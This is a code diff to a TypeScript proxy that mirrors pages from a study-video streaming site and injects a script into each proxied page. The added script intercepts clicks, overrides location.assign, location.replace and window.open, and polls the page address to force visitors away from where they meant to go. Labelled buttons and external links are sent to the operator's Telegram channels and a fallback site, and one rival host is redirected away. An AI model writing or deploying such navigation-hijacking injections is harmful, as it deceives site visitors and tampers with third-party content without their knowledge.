@@ -32,10 +32,83 @@ function rewriteText(body: string): string {
   // Make upstream absolute URLs relative so they route back through this proxy.
   out = out.replace(/https?:\/\/stream\.studyratna\.cc/g, "");
   if (/<\/body>/i.test(out)) {
-    out = out.replace(/<\/body>/i, `${INSTANT_BATCHES_FALLBACK}</body>`);
+    out = out.replace(/<\/body>/i, `${REDIRECT_GUARD}${INSTANT_BATCHES_FALLBACK}</body>`);
   }
   return out;
 }
+
+const REDIRECT_GUARD = String.raw`<script>
+(function(){
+  var TG_MAIN='https://t.me/official_marco_22';
+  var TG_TUTORIAL='https://t.me/+Ac8Hg9aN2Vw5NjFl';
+  var FALLBACK='https://apexstudy.kesug.com';
+  var ALLOWED=/^(https?:)?\/\/(([^\/]*\.)?lovable\.app|([^\/]*\.)?lovable\.dev|t\.me|telegram\.me|apexstudy\.kesug\.com)/i;
+  var BLOCKED=/vidcloud\.eu\.org/i;
+  function classify(url){
+    try{
+      if(!url) return null;
+      var s=String(url).trim();
+      if(!s || s==='#' || s.startsWith('javascript:')) return null;
+      if(s.startsWith('/') && !s.startsWith('//')) return null; // internal
+      if(BLOCKED.test(s)) return TG_MAIN;
+      if(/^(https?:)?\/\//i.test(s)){
+        if(ALLOWED.test(s)) return null;
+        return FALLBACK;
+      }
+      return null;
+    }catch(e){return null;}
+  }
+  function textOf(el){return (el && (el.innerText||el.textContent)||'').trim().toLowerCase();}
+  function targetForButton(el){
+    var t=textOf(el);
+    if(!t) return null;
+    if(t.indexOf('watch tutorial')>=0) return TG_TUTORIAL;
+    if(t.indexOf('generate access key')>=0) return TG_MAIN;
+    if(t.indexOf('back to batch')>=0) return TG_MAIN;
+    return null;
+  }
+  document.addEventListener('click', function(ev){
+    var el=ev.target;
+    while(el && el!==document.body){
+      if(el.tagName==='A' || el.tagName==='BUTTON' || el.getAttribute && el.getAttribute('role')==='button'){
+        var forced=targetForButton(el);
+        if(forced){ ev.preventDefault(); ev.stopPropagation(); window.location.href=forced; return; }
+        if(el.tagName==='A'){
+          var href=el.getAttribute('href')||'';
+          var redir=classify(href);
+          if(redir){ ev.preventDefault(); ev.stopPropagation(); window.location.href=redir; return; }
+        }
+      }
+      el=el.parentNode;
+    }
+  }, true);
+  // Intercept programmatic navigation
+  try{
+    var _assign=window.location.assign.bind(window.location);
+    var _replace=window.location.replace.bind(window.location);
+    window.location.assign=function(u){var r=classify(u);_assign(r||u);};
+    window.location.replace=function(u){var r=classify(u);_replace(r||u);};
+  }catch(e){}
+  try{
+    var _open=window.open;
+    window.open=function(u,n,f){var r=classify(u);return _open.call(window, r||u, n, f);};
+  }catch(e){}
+  try{
+    var desc=Object.getOwnPropertyDescriptor(Window.prototype,'location') || Object.getOwnPropertyDescriptor(window,'location');
+    // href setter guard via periodic check as fallback
+    var lastHref=location.href;
+    setInterval(function(){
+      if(location.href!==lastHref){
+        var r=classify(location.href);
+        lastHref=location.href;
+        if(r){ location.href=r; }
+      }
+    }, 300);
+  }catch(e){}
+})();
+</script>`;
+
+
 
 const INSTANT_BATCHES_FALLBACK = String.raw`<script>
 (function(){
